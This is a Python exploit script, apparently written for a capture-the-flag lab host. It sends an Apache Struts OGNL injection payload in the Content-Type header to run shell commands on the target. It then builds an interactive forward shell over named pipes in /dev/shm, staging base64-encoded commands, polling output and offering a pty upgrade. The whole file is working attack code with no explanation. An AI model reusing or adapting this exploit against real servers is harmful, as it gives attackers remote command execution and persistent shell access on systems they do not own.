#!/usr/bin/python3

import base64
import random
import requests
import threading
import time

class WebShell(object):
    # Initialize class and setup shell
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        self.url = r"http://10.10.10.64/Monitoring/example/Welcome.action"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # Set up shell
        print("[*] Setting up FIFO shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # Set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen and wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echon -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    # Execute command
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}

        headers = {'User-Agent': 'Struts-User-Agent', 'Content-Type': payload}
        try:
            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass

    # Send Base64 command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # Upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

prompt = "Shell> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
